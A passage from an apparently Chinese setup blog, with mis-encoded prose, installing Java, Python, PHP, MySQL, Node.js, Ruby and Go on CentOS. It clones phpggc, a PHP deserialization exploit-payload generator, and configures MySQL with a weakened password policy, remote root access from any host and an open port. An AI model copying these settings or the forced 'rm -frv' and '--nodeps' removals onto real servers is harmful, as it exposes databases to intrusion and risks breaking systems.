JRE_HOME=/opt/java/jdk-11</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æº</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Java8"><a href="#Java8" class="headerlink" title="Java8"></a>Java8</h3><p>yumå®‰è£…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install java-<span class="number">1.8</span><span class="number">.0</span>-openjdk.x86_64 -y</span><br></pre></td></tr></table></figure><p>æºç å®‰è£…-jdk-8u77</p><p>éœ€è¦è‡ªå·±ä¸‹è½½æºç ã€å®˜ç½‘ä¸‹è½½éœ€è¦æ³¨å†Œç™»å½•ä¸‹è½½ï¼Œ1.8ä¹‹åçš„ï¼Œå¯è‡ªè¡Œæ³¨å†Œä¸‹è½½ï¼Œæ‰€éœ€ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf jdk-8u77-linux-x64.tar.gz -C /opt/java</span><br><span class="line">rm -rf jdk-8u77-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 8</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk1.8.0_77</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk1.8.0_77</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Java7"><a href="#Java7" class="headerlink" title="Java7"></a>Java7</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf jdk-7u80-linux-x64.tar.gz -C /opt/java</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 7</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk1.7.0_80</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk1.7.0_80</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Javaåˆ‡æ¢JDK-ç‰ˆæœ¬"><a href="#Javaåˆ‡æ¢JDK-ç‰ˆæœ¬" class="headerlink" title="Javaåˆ‡æ¢JDK ç‰ˆæœ¬"></a>Javaåˆ‡æ¢JDK ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†Javaç›®å½•åŠ å…¥JDKé€‰æ‹©åˆ—è¡¨</span></span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk-11/bin/java  11</span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.8.0_77/bin/java  8</span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.7.0_80/bin/java  7</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ¢ç‰ˆæœ¬é€‰æ‹©éœ€è¦jdkçš„ç‰ˆæœ¬</span></span><br><span class="line">update-alternatives  --config  java     </span><br></pre></td></tr></table></figure><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>å®‰è£…Javaæ‰“åŒ…ç¨‹åº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//dlcdn.apache.org/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span></span><br><span class="line">tar -xvf  apache-maven-<span class="number">3.6</span><span class="number">.3</span>-bin.tar.gz</span><br><span class="line">mv -f apache-maven-<span class="number">3.6</span><span class="number">.3</span> /usr/local/</span><br><span class="line">rm -rf apache-maven-<span class="number">3.6</span><span class="number">.3</span>-bin.tar.gz</span><br></pre></td></tr></table></figure><p>æ·»åŠ ç¯å¢ƒå˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># maven</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/usr/<span class="built_in">local</span>/apache-maven-3.6.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;MAVEN_HOME&#125;</span>/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">mvn -v</span><br></pre></td></tr></table></figure><h2 id="Python-3-9-7"><a href="#Python-3-9-7" class="headerlink" title="Python 3.9.7"></a>Python 3.9.7</h2><p><a href="https://note.qidong.name/2021/05/multiple-python/">https://note.qidong.name/2021/05/multiple-python/</a></p><p>Linux å®‰è£…</p><p>1.æŸ¥çœ‹Python ç‰ˆæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -V</span><br><span class="line"><span class="comment"># CentOS 7 ä¸­è‡ªå¸¦çš„pythonç‰ˆæœ¬æ˜¯python-2.7.5 ,pythonæ˜¯3.6çš„å¾ˆå¤šç‰ˆæœ¬éœ€è¦3.7çš„æ‰€éœ€éœ€è¦å®‰è£…é«˜ç‰ˆæœ¬ï¼Œ</span></span><br></pre></td></tr></table></figure><p>2.ä¸‹è½½å®‰è£…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/<span class="number">3.9</span><span class="number">.7</span>/Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz</span><br><span class="line">tar -xvJf Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz</span><br><span class="line">yum install -y zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc  libffi-devel</span><br><span class="line">cd Python-<span class="number">3.9</span><span class="number">.7</span></span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cd ..</span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz Python-<span class="number">3.9</span><span class="number">.7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½</span></span><br><span class="line"><span class="comment"># è§£å‹</span></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–åŒ…</span></span><br><span class="line"><span class="comment"># è¿›å…¥pythonç›®å½•</span></span><br><span class="line"><span class="comment"># ç¼–è¯‘</span></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br></pre></td></tr></table></figure><p>3.åˆ›å»ºé“¾æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/python3<span class="number">.9</span> /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/pip3<span class="number">.9</span> /usr/<span class="built_in">bin</span>/pip3</span><br><span class="line"><span class="comment"># åˆ›å»ºpython3é“¾æ¥</span></span><br><span class="line"><span class="comment"># åˆ›å»ºpip3é“¾æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ›´æ–° pip</span></span><br><span class="line">/usr/local/python3/<span class="built_in">bin</span>/python3<span class="number">.9</span> -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>4.ä¿®æ”¹yumé…ç½®ï¼ˆå¯é€‰ï¼‰</p><p>å› ä¸ºæ‰§è¡Œyuméœ€è¦python2ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦ä¿®æ”¹yumçš„é…ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/<span class="built_in">bin</span>/yum</span><br><span class="line"><span class="comment">#! /usr/bin/pythonä¿®æ”¹ä¸º#! /usr/bin/python2</span></span><br><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line"><span class="comment">#! /usr/bin/python ä¹Ÿè¦ä¿®æ”¹ä¸º#! /usr/bin/python2</span></span><br></pre></td></tr></table></figure><p>5.åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰ï¼‰</p><p><a href="https://www.huaweicloud.com/articles/0cd569e4f8aab86e7f4ec3be6adce8fb.html">virtualenv</a> æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨åŒä¸€è®¡ç®—æœºä¸­éš”ç¦»å¤šä¸ªpythonç‰ˆæœ¬çš„å·¥å…·ã€‚å¦‚ python2.7 / python3.9 ï¼Œä½†æ˜¯å¦‚æœéƒ½è£…åˆ°ä¸€èµ·ï¼Œç»å¸¸ä¼šå¯¼è‡´é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install virtualenv</span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ–‡ä»¶è·¯å¾„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="comment">#åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ </span></span><br><span class="line">VIRTUALENVWRAPPER_PYTHON=/usr/local/python3/<span class="built_in">bin</span>/python3 <span class="comment"># æŒ‡å®švirtualenvwrapperæ‰§è¡Œçš„pythonç‰ˆæœ¬</span></span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs <span class="comment"># æŒ‡å®šè™šæ‹Ÿç¯å¢ƒå­˜æ”¾ç›®å½•ï¼Œ.virtualenvsç›®å½•åå¯è‡ªæ‹Ÿ</span></span><br><span class="line">source /usr/local/python3/<span class="built_in">bin</span>/virtualenvwrapper.sh <span class="comment"># virtualenvwrapper.shæ‰€åœ¨ç›®å½•</span></span><br></pre></td></tr></table></figure><p>å®‰è£…virtualenv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/virtualenv /usr/local/<span class="built_in">bin</span>/virtualenv</span><br><span class="line">mkvirtualenv --python=/usr/<span class="built_in">bin</span>/python3 py3-env</span><br></pre></td></tr></table></figure><p>6.å¸è½½ Python3 ï¼ˆå¯é€‰ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¸è½½pyhton3</span></span><br><span class="line">rpm -qa|grep python3|xargs rpm -ev --allmatches --nodeps</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤æ‰€æœ‰æ®‹ä½™æ–‡ä»¶</span></span><br><span class="line">whereis python3 |xargs rm -frv</span><br><span class="line"><span class="comment">#å¸è½½å®Œæˆ</span></span><br><span class="line"><span class="comment">#æŸ¥çœ‹ç°æœ‰çš„å·²å®‰è£…çš„python</span></span><br><span class="line">whereis python</span><br></pre></td></tr></table></figure><h2 id="Python-2-æ‰©å±•"><a href="#Python-2-æ‰©å±•" class="headerlink" title="Python 2 æ‰©å±•"></a>Python 2 æ‰©å±•</h2><p>Centos7 é»˜è®¤è‡ªå¸¦ Python 2.7.5 ç‰ˆæœ¬ï¼Œä½†æ˜¯ç¼ºå°‘ pipåº“ ä»¥åŠå¸¸ç”¨çš„æ¨¡å—ï¼Œè¿™é‡Œåˆ—ä¸¾äº†ï¼Œæ¨¡å—çš„å®‰è£…æ–¹å¼ï¼Œå¦‚æœpip å®‰è£…ä¸æˆåŠŸï¼Œå¯ä»¥å°è¯•é€šè¿‡å»å®˜ç½‘ä¸‹è½½ç¼–è¯‘å®‰è£…</p><p>Python2çš„å¸¸ç”¨çš„åº“   <a href="https://pypi.org/">https://pypi.org/</a></p><p>å®‰è£…æ–¹å¼åˆ—ä¸¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… setuptools</span></span><br><span class="line">wget https://pypi.python.org/packages/<span class="number">45</span>/<span class="number">29</span>/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span><span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span> </span><br><span class="line">cd setuptools-<span class="number">36.6</span><span class="number">.0</span></span><br><span class="line">python setup.py install</span><br><span class="line">cd .. </span><br><span class="line">rm -rf setuptools-<span class="number">36.6</span><span class="number">.0</span> setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… requests</span></span><br><span class="line">wget https://pypi.python.org/packages/5b/0b/34be574b1ec997247796e5d516f3a6b6509c4e064f2885a96ed885ce7579/requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz</span><br><span class="line">tar -zxvf requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz</span><br><span class="line">cd requests-<span class="number">2.12</span><span class="number">.4</span></span><br><span class="line">python setup.py install</span><br><span class="line">cd ..</span><br><span class="line">rm -rf requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz requests-<span class="number">2.12</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>å®‰è£… pip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/<span class="number">11</span>/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz<span class="comment">#md5=35f01da33009719497f01a4ba69d63c9</span></span><br><span class="line">tar -zxvf pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz</span><br><span class="line">cd pip-<span class="number">9.0</span><span class="number">.1</span></span><br><span class="line">python setup.py install</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">cd ..</span><br><span class="line">rm -rf pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz pip-<span class="number">9.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h2 id="PHP-ç¯å¢ƒå®‰è£…"><a href="#PHP-ç¯å¢ƒå®‰è£…" class="headerlink" title="PHP ç¯å¢ƒå®‰è£…"></a>PHP ç¯å¢ƒå®‰è£…</h2><h3 id="PHP7-3"><a href="#PHP7-3" class="headerlink" title="PHP7.3"></a>PHP7.3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install -y epel-release yum-utils</span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm</span><br><span class="line">yum install -y php73-php-fpm php73-php-cli php73-php-bcmath php73-php-gd php73-php-json php73-php-mbstring php73-php-mcrypt php73-php-mysqlnd php73-php-opcache php73-php-pdo php73-php-pecl-crypto php73-php-pecl-mcrypt php73-php-pecl-geoip php73-php-pecl-swoole php73-php-recode php73-php-snmp php73-php-soap php73-php-xmll</span><br><span class="line">ln -s /opt/remi/php73/root/usr/bin/php /usr/bin/php</span><br></pre></td></tr></table></figure><h3 id="phpggc"><a href="#phpggc" class="headerlink" title="phpggc"></a>phpggc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ambionics/phpggc.git</span><br></pre></td></tr></table></figure><h2 id="MySQL-å®‰è£…"><a href="#MySQL-å®‰è£…" class="headerlink" title="MySQL å®‰è£…"></a>MySQL å®‰è£…</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><p><a href="https://cloud.tencent.com/developer/article/1886339">https://cloud.tencent.com/developer/article/1886339</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># centos 7</span></span><br><span class="line">wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">rpm -Uvh mysql57-community-release-el7-10.noarch.rpm</span><br><span class="line">yum install -y mysql-community-server</span><br><span class="line">systemctl start mysqld.service</span><br><span class="line">systemctl status mysqld.service</span><br><span class="line">systemctl <span class="built_in">enable</span> mysqld</span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥è¯¢å¯†ç </span></span><br><span class="line">grep <span class="string">&#x27;temporary password&#x27;</span> /var/<span class="built_in">log</span>/mysqld.log </span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å¯†ç å¤æ‚åº¦</span></span><br><span class="line"><span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line"><span class="built_in">set</span> global validate_password_length=1;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®å¯†ç </span></span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;yourpassword&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆæƒå…¶ä»–æœºå™¨è¿œç¨‹ç™»å½•</span></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;yourpassword&#x27;</span> WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹ä¸ºUTF-8 ä¿®æ”¹å†…å®¹å¦‚ä¸‹</span></span><br><span class="line">vim /etc/my.cnf</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">character_set_server=utf8</span><br><span class="line"> </span><br><span class="line">symbolic-links=0</span><br><span class="line"> </span><br><span class="line">log-error=/var/<span class="built_in">log</span>/mysqld.log</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯</span></span><br><span class="line">service mysqld restart</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ·»åŠ é˜²ç«å¢™è§„åˆ™</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line">firewall-cmd --zone=public --add-port=3306/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>å¸è½½MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep mysql</span><br><span class="line">yum -y remove mysql57-community-release-el7-10.noarch</span><br></pre></td></tr></table></figure><h2 id="Redis-å®¢æˆ·ç«¯"><a href="#Redis-å®¢æˆ·ç«¯" class="headerlink" title="Redis å®¢æˆ·ç«¯"></a>Redis å®¢æˆ·ç«¯</h2><p>æ˜¯è¿æ¥ç”¨çš„å®¢æˆ·ç«¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar xvzf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make</span><br><span class="line">sudo cp src/redis-cli /usr/local/<span class="built_in">bin</span>/</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure><h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><p>node-v16.15.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/<span class="built_in">local</span>/node</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/node</span><br><span class="line">wget https://npmmirror.com/mirrors/node/v16.15.0/node-v16.15.0-linux-x64.tar.xz</span><br><span class="line">tar xf node-v16.15.0-linux-x64.tar.xz </span><br><span class="line">rm -rf node-v16.15.0-linux-x64.tar.xz  </span><br><span class="line"></span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/node/node-v16.15.0-linux-x64/bin/npm /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/node/node-v16.15.0-linux-x64/bin/node /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure><h2 id="Rubyå®‰è£…"><a href="#Rubyå®‰è£…" class="headerlink" title="Rubyå®‰è£…"></a>Rubyå®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://cache.ruby-lang.org/pub/ruby/3.1/ruby-3.1.2.tar.gz</span><br><span class="line">tar zxvf ruby-3.1.2.tar.gz</span><br><span class="line">rm -rf ruby-3.1.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ruby-3.1.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="Goç¯å¢ƒ"><a href="#Goç¯å¢ƒ" class="headerlink" title="Goç¯å¢ƒ"></a>Goç¯å¢ƒ</h2><h3 id="1-Linux"><a href="#1-Linux" class="headerlink" title="1.Linux"></a>1.Linux</h3><p>go å®˜ç½‘ ï¼š<a href="https://golang.org/dl/">https://golang.org/dl/</a></p><p>å®‰è£…æ•™ç¨‹ï¼š<a href="https://www.runoob.com/go/go-environment.html">https://www.runoob.com/go/go-environment.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.17.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/<span class="built_in">local</span> -xzf go1.17.linux-amd64.tar.gz</span><br><span class="line">rm -rf go1.17.linux-amd64.tar.gz go1.17.linux-amd64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment"># go</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/usr/local/go/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><p>è®¾ç½®å›½å†…ä»£ç† !!!!    VPSåœ¨å›½å¤–å¯å¿½ç•¥</p><p><a href="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md">https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure><h3 id="2-windows"><a href="#2-windows" class="headerlink" title="2.windows"></a>2.windows</h3><p>åœ¨powershellè¿è¡Œï¼Œåˆ‡æ¢å›½å†…ä»£ç†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span>:GO111MODULE = <span class="string">&quot;on&quot;</span></span><br><span class="line"><span class="variable">$env</span>:GOPROXY = <span class="string">&quot;https://goproxy.cn&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Docker-ç¯å¢ƒ"><a href="#Docker-ç¯å¢ƒ" class="headerlink" title="Docker ç¯å¢ƒ"></a>Docker ç¯å¢ƒ</h2><p>1.æ£€æŸ¥ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 